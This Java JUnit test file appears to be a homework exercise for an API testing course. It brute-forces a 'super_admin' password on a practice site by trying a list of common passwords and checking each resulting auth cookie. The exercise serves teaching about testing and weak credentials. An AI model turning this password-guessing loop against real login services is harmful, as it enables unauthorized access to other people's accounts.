package hw;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

public class Ex9 {

    @Test
    public void testEx9() {
        List<String> passwords = Arrays.asList(
            "master", "sunshine", "letmein", "abc123", "111111", "login", "1qaz2wsx", "admin", "qwertyuiop",
            "iloveyou", "1234567", "1234567890", "solo", "monkey", "welcome", "1q2w3e4r"
        );
        Map<String, String> params = new HashMap<>();
        params.put("login", "super_admin");
        Response response;
        String cookie;

        for (String password : passwords) {
            params.put("password", password);
            System.out.println(params);
            response = getCookie(params);
            cookie = response.getCookie("auth_cookie");
            response = checkCookie(cookie);
            if (response.asPrettyString().contains("You are NOT authorized")) {
                response.prettyPrint();
                params.remove("password");
            } else {
                response.prettyPrint();
                System.out.println("Password is: " + params.get("password"));
                break;
            }
        }
    }

    public Response getCookie(Map<String, String> params) {
        return RestAssured
            .given()
            .body(params)
            .get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
            .andReturn();
    }

    public Response checkCookie(String cookie) {
        Map<String, String> cookies = new HashMap<>();
        cookies.put("auth_cookie", cookie);
        return RestAssured
            .given()
            .cookies(cookies)
            .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
            .andReturn();
    }
}
